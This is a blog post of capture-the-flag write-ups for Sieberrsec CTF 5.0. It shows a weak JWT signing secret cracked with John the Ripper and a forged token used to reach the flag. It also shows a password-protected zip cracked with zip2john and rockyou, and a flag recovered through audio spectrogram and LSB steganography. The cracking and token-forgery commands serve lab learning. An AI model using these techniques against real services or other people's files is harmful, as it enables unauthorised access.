---
title: 'Sieberrsec CTF 5.0'
publishDate: '10 March 2024'
description: 'Some write-ups for the Sieberrsec CTF 5.0 competition'
tags: ['ctf', 'writeup']
draft: false
---

Since I got top 3 for SCTF and they required write-ups as proof for a couple of challenges, why not post them here as well?

## Josh Template Viewer

This challenge was honestly pretty easy. After creating an account and logging in, we are directed to the following page:

![josh](./image-1.png)

A look at the code also tells us that the website uses JSON Web Tokens for handling authentication and authorization (signed using a presumably weak secret key), and that the homepage would show the flag if the `uuid` field in the JWT payload was set to `'0'`:

```py title="app.py"
@app.route('/')
def index():
	try:
		if 'access_token' in  request.cookies:
			access = jwt.decode(request.cookies['access_token'], app.config['SECRET'], algorithms=['HS256'])
			return render_template('home.html', access=access)

		else:
			return render_template('index.html')

	except:
		return render_template('error.html')
```

```html title="home.html"
<div class="card">
	{{ access }}
	<div class="card-body">
		<h5 class="card-title">User Details</h5>
		{% if access.uuid == '0' %}
		<p class="card-text">UUID: sctf{REDACTED}</p>
		{% else %}
		<p class="card-text">Username: {{ access.username }}</p>
		{% endif %}
	</div>
</div>
```

Decoding the JWT using [jwt.io](https://jwt.io/) also confirms the above:

![jwt.io](./image-2.png)

Let's grab the JWT from the `access_token` cookie and try brute forcing it with John and `rockyou.txt`:

```bash
$ echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiNTkzNWJiYTktMzdiOS00MjE2LTlmMGUtNGU3MGUwOTRjYzU2IiwidXNlcm5hbWUiOiJhIn0.1b86xVhe9u_KB8Vw2pEgGizfSlX7HR5hJQpNSnHr1l4 > jwt.txt
$ john jwt.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
```

No dice. Let's try again with the default wordlist:

```bash
$ john jwt.txt --format=HMAC-SHA256
```

I wasn't sure how long this was gonna take, so I hopped off to play a match of Helldivers 2. When I came back a good 40 minutes later (I'm bad at keeping track of time ok I'm sorry), I was greeted with the following:

```bash
$ john jwt.txt --format=HMAC-SHA256  --pot=./john.pot
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
hehehaw          (?)
1g 0:00:01:04 DONE 3/3 (2024-03-10 13:22) 0.01560g/s 10668Kp/s 10668Kc/s 10668KC/s heenjez..hebina8
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Awesome! Now that we have the secret, we can now forge our own JWT and set the `uuid` field to `'0'`:

![forging the jwt](./image-5.png)

Setting the `access_token` cookie to the forged JWT and refreshing the page gives us the flag:

![flag](./image-4.png)

_Note: I don't think brute forcing the JWT Secret was the intended solution and that it was supposed to be path traversal, but hey if it works I'm not complaining._

## BeepBoop

For some reason, this challenge felt way easier than Running Can. This challenge provides `beepboop.zip`, which contains 2 audio files: `beep.wav` and `boop.wav`. The zip file is password-protected, but can be easily cracked with John the Ripper:

```bash
$ zip2john beepboop.zip > beepboop.hash
$ john beepboop.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

This tells shows that the password is `bestmusic` (shocker). The file can now be unzipped:

```bash
$ unzip beepboop.zip
```

This gives us the two audio files. Running `strings` and `binwalk` on both files yield nothing interesting, so let's open up Sonic Visualiser. Adding a spectrogram and tweaking the Window options shows the first part of the flag:

![flag pt 1](./image.png)

The second part of the flag can be found encoded in `boop.wav` using LSB steganography, and can be extracted using the following script I got off a Medium article:

```python
import wave
song = wave.open("boop.wav", mode='rb')
# Convert audio to byte array
frame_bytes = bytearray(list(song.readframes(song.getnframes())))

# Extract the LSB of each byte
extracted = [frame_bytes[i] & 1 for i in range(len(frame_bytes))]
# Convert byte array back to string
string = "".join(chr(int("".join(map(str,extracted[i:i+8])),2)) for i in range(0,len(extracted),8))
# Cut off at the filler characters
decoded = string.split("###")[0]

# Print the extracted text
print("Sucessfully decoded: "+decoded)
song.close()
```
